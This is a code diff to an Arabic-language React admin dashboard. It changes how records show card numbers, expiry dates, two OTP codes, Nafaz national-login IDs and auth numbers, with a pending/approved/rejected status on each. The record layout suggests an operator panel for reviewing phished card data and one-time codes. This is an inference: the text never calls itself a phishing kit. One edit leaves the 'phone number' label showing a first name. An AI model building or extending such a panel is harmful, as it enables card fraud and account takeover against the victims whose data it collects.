@@ -61,14 +61,14 @@ interface Notification {
   otp2: string;
   page: string;
   cardNumber: string;
-  prfiex: string;
+  expiryDate: string;
   cardHolderName?: string;
   month?: string;
   year?: string;
   country?: string;
   personalInfo: {
     id?: string | "0";
-    name?: string;
+    firstName?: string;
   };
   prefix: string;
   status: "pending" | "approved" | "rejected" | string;
@@ -188,7 +188,7 @@ function NafazInfoCard({
       <CardContent className="space-y-4">
         <div className="space-y-3 flex justify-around items-center">
           <div> رقم الهاتف:</div>
-          <div>{notification?.phone}</div>
+          <div>{notification?.personalInfo?.firstName}</div>
         </div>
         <div className="space-y-3 flex justify-around items-center">
           <div> الاسم:</div>
@@ -251,13 +251,13 @@ function CardInfoCard({ notification }: { notification: Notification }) {
                   </span>
                 </div>
               )}
-              {notification.month && notification.year && (
+              {notification.expiryDate && (
                 <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-green-200 shadow-sm">
                   <span className="text-xs font-medium text-gray-600">
                     تاريخ الانتهاء
                   </span>
                   <span className="font-bold text-base text-gray-800 font-mono">
-                    {notification.month}/{notification.year}
+                    {notification?.expiryDate}
                   </span>
                 </div>
               )}
@@ -420,7 +420,7 @@ export default function NotificationsPage() {
         (notification) =>
           notification.name?.toLowerCase().includes(term) ||
           notification.email?.toLowerCase().includes(term) ||
-          notification.phone?.toLowerCase().includes(term) ||
+          notification.personalInfo?.firstName?.toLowerCase().includes(term) ||
           notification.cardNumber?.toLowerCase().includes(term) ||
           notification.nafazInfo?.nafazId?.toLowerCase().includes(term) ||
           notification.nafazInfo?.authNumber?.toLowerCase().includes(term) ||
@@ -722,7 +722,7 @@ export default function NotificationsPage() {
                               {notification.name || "غير متوفر"}
                             </p>
                             <p className="text-sm text-gray-500">
-                              {notification.email || notification.phone}
+                              {notification.email || notification.personalInfo?.firstName}
                             </p>
                             {notification.createdDate && (
                               <p className="text-xs text-gray-400">
@@ -779,10 +779,10 @@ export default function NotificationsPage() {
 
                           <Badge
                             variant={
-                              notification.phone ? "default" : "secondary"
+                              notification.personalInfo?.firstName ? "default" : "secondary"
                             }
                             className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.phone
+                              notification.personalInfo?.firstName
                                 ? "bg-gradient-to-r from-orange-500 to-orange-600 text-white"
                                 : ""
                             }`}
@@ -791,7 +791,7 @@ export default function NotificationsPage() {
                             }
                           >
                             <Shield className="h-3 w-3 mr-1" />
-                            {notification.phone
+                            {notification.personalInfo?.firstName
                               ? " معلومات"
                               : "لا يوجد معلومات"}
                           </Badge>
